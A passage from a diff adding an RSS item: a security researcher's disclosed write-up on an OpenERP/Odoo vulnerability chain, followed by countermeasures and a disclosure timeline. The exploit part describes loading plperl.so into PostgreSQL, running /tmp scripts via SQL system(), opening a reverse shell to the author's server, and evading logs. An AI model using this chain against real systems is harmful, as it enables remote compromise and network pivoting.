+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;select system(&amp;#39;/usr/bin/python /tmp/ex.py&amp;#39;) &lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;What we are actually doing is:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create a table with a field of type ‘oid’, which can contain binary data in a raw format, and which can be exported directly to the disk on the server.&lt;/li&gt;
+  &lt;li&gt;Create a function to convert bytea to oid.&lt;/li&gt;
+  &lt;li&gt;Create a class that will automagically convert bytea to oid using the above function.  When we decode base64, it will go into the bytea format. This will allow us to directly import base64 straight back into a binary oid.&lt;/li&gt;
+  &lt;li&gt;This is inserting a base64 conversion of plperl.so for PostgreSQL 9.3.5.  This is what comes with Ubuntu 14.04 Server.  If you need to figure out which version of PostgreSQL is under the hood to get the correct file to use, you can use something like this, which will put the results into Settings → Technical → Parameters → System Parameters:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;cr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;INSERT INTO ir_config_parameter (key, value) VALUES (&amp;#39;Version&amp;#39;, VERSION());&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Considering that most OpenERP installations are running Ubuntu, worst case scenario you can spin up a matching VM and get the .so file.  This file gives us the ability to launch shell commands.  To generate the base64 for this, use this command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[danny@localhost ~]$ base64 plperl.so 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Uploading the attack script.  This is just a small python script that sets up a reverse tunnel over port 443 back to my waiting server.&lt;/li&gt;
+  &lt;li&gt;This exports the library into a file at /tmp&lt;/li&gt;
+  &lt;li&gt;This exports the script to a file at /tmp&lt;/li&gt;
+  &lt;li&gt;This creates a PostgreSQL function bound to the library that we uploaded earlier to execute shell commands, and&lt;/li&gt;
+  &lt;li&gt;This uses that to run the script, which then connects back to me.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;After I save the server action, I click Add in the ‘More’ menu.  Refresh the page, and your new piece of code should be ready to run right there.  Make sure you are ready to receive the exploit, and launch it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPServerAction.jpg&quot; alt=&quot;Run Attack SQL Server Action&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/OpenERPMetasploit.jpg&quot; alt=&quot;Metasploit Receiver&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And in the logs:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;2014-09-09 00:33:21,379 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] &quot;POST /web/action/run HTTP/1.1&quot; 200 - 
+2014-09-09 00:33:21,415 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] &quot;POST /web/dataset/call_kw/ir.actions.server/search_read HTTP/1.1&quot; 200 - 
+2014-09-09 00:33:21,515 752 INFO TestDatabase werkzeug: 10.110.6.12 - - [09/Sep/2014 00:33:21] &quot;POST /web/dataset/search_read HTTP/1.1&quot; 200 - 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nothing suspicious.  From here, I can further attack the box, or I can pivot and attack the rest of the internal network.&lt;/p&gt;
+
+&lt;h2 id=&quot;countermeasures&quot;&gt;Countermeasures&lt;/h2&gt;
+
+&lt;h3 id=&quot;update-to-the-latest-version&quot;&gt;Update to the latest version&lt;/h3&gt;
+
+&lt;p&gt;This was all done on version 7 and version 8 of Odoo.  If you are still running these (latest is version 9), please upgrade to the latest immediately.&lt;/p&gt;
+
+&lt;h3 id=&quot;lock-down-database-admin-area&quot;&gt;Lock down database admin area&lt;/h3&gt;
+
+&lt;p&gt;Use a secure master password, and IP restrict /web/database to trusted IPs only.  If you are using nginx (you should be, at the very least for SSL) add the following to your nginx.conf:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;location ~ ^/(web/database/) {
+              allow 1.2.3.4;
+              deny all;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Replace the 1.2.3.4 with your trusted IPs.&lt;/p&gt;
+
+&lt;h3 id=&quot;lock-down-postgresql&quot;&gt;Lock down Postgresql&lt;/h3&gt;
+
+&lt;p&gt;By default, Odoo now doesn’t give itself superadmin rights with Postgres, which prevents all of the Postgres exploits to get a remote shell.  Make sure you verify that the Odoo/OpenERP user is not running as superadmin.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;su - postgres
+psql
+
+postgres=# \du
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you see (odoo or openerp, depending on version):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                             List of roles
+ Role name |                   Attributes                   | Member of 
+-----------+------------------------------------------------+-----------
+ odoo      | Superuser, Create role, Create DB              | {}
+ openerp   | Superuser, Create role, Create DB              | {}
+ postgres  | Superuser, Create role, Create DB, Replication | {}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then you need to restrict the odoo or openerp users.  You’d clean it up with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;postgres=# alter role odoo with nosuperuser;
+ALTER ROLE
+postgres=# alter role odoo with nocreaterole;
+ALTER ROLE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It should look like&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;postgres=# \du
+                             List of roles
+ Role name |                   Attributes                   | Member of 
+-----------+------------------------------------------------+-----------
+ odoo      | Create DB                                      | {}
+ postgres  | Superuser, Create role, Create DB, Replication | {}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2014-09-09 Disclosed findings to Odoo&lt;/li&gt;
+  &lt;li&gt;2014-09-10 Response addressing findings from Odoo security team, with timeline for fixes&lt;/li&gt;
+  &lt;li&gt;2014-10-14 Odoo responded with most critical vulnerabilities fixed, with all being fixed and deployed on the 10-15.&lt;/li&gt;
+  &lt;li&gt;2014-12-09 Disclosure date&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+				<pubDate>Mon, 08 Dec 2014 12:00:00 -0500</pubDate>
+				<link>https://digital-panther.com/2014/12/opwnerp-research</link>
+				<guid isPermaLink="true">https://digital-panther.com/2014/12/opwnerp-research</guid>
+			</item>
+		
+	</channel>
+</rss>
